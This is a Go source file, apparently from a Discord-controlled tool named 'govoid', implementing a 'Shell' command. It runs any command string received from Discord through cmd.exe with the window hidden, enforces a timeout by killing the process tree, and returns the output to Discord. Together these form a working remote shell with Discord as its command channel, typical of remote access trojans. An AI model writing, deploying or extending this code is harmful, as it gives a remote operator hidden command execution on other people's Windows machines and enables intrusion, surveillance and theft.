//go:build windows

package commands

import (
	"context"
	"errors"
	"fmt"
	"os/exec"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/local/govoid/internal/util"
)

// Shell ejecuta cmd.exe /c con timeout de 30 segundos y devuelve la salida
// troceada, con embed verde o rojo según el código de salida.
func Shell(s *discordgo.Session, i *discordgo.InteractionCreate) {
	if err := Defer(s, i); err != nil {
		return
	}

	command := StringOption(i, "cmd")
	if isBlank(command) {
		Finish(s, i, "❌ Comando vacío.")
		return
	}

	ctx, cancel := context.WithTimeout(context.Background(), shellTimeout)
	defer cancel()

	output, exitCode, timedOut := runShell(ctx, command)

	color := 3066993 // verde
	title := fmt.Sprintf("✅ Shell — exit %d", exitCode)
	if exitCode != 0 {
		color = 15158332 // rojo
		title = fmt.Sprintf("❌ Shell — exit %d", exitCode)
	}
	if timedOut {
		title += " — timeout 30s"
	}

	body := output
	if isBlank(body) {
		body = "(sin salida)"
	}
	// Las triples comillas rompen el bloque de código: se sustituyen antes de
	// trocear, no solo en la primera parte.
	body = strings.ReplaceAll(body, "```", "'''")

	// El corte se hace por rune: partir un carácter multibyte deja UTF-8
	// inválido y Discord lo muestra como basura.
	head := util.SafeCut(body, 3900)
	rest := body[len(head):]

	embed := &discordgo.MessageEmbed{
		Title:       title,
		Description: "```\n" + head + "\n```",
		Color:       color,
		Timestamp:   nowTimestamp(),
	}

	content := fmt.Sprintf("💻 `%s`", truncate(command, 200))
	embeds := []*discordgo.MessageEmbed{embed}
	if _, err := s.InteractionResponseEdit(i.Interaction, &discordgo.WebhookEdit{
		Content: &content,
		Embeds:  &embeds,
	}); err != nil {
		return
	}

	if rest != "" {
		FollowupChunks(s, i, rest)
	}
}

const shellTimeout = 30 * time.Second

// runShell ejecuta cmd.exe /c y devuelve la salida combinada, el código de
// salida y si el contexto venció antes de terminar.
//
// cmd.exe lanza el comando real como hijo: matar solo el padre deja al nieto
// con los pipes abiertos y CombinedOutput se queda colgado. Cancel mata el
// árbol entero con taskkill /T y WaitDelay cierra los pipes como red de
// seguridad si algún descendiente sobrevive.
func runShell(ctx context.Context, command string) (string, int, bool) {
	cmd := exec.CommandContext(ctx, "cmd.exe", "/c", command)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: createNoWindow}
	cmd.Cancel = func() error {
		if cmd.Process == nil {
			return nil
		}
		killer := exec.Command("taskkill", "/F", "/T", "/PID", strconv.Itoa(cmd.Process.Pid))
		killer.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: createNoWindow}
		_ = killer.Run()
		return cmd.Process.Kill()
	}
	cmd.WaitDelay = 2 * time.Second

	output, err := cmd.CombinedOutput()

	exitCode := 0
	if err != nil {
		var exitErr *exec.ExitError
		if errors.As(err, &exitErr) {
			exitCode = exitErr.ExitCode()
		} else {
			exitCode = -1
		}
	}

	return string(output), exitCode, ctx.Err() == context.DeadlineExceeded
}
